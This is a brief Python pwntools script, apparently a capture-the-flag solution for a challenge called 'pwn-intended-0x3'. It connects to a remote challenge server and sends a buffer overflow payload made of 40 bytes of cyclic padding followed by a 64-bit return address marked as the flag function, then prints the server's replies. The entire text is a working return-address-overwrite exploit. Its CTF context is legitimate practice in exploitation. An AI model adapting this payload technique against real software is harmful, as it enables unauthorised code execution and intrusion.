from pwn import *

host, port = 'chall.csivit.com', 30013
r = remote(host, port)
#r = process('./pwn-intended-0x3')

offset = 40
addr = 0x00000000004011ce # flag

payload = cyclic(offset)
payload += p64(addr)

print(r.recv())
r.sendline(payload)
print(r.recv())
print(r.recv())
print(r.recv())
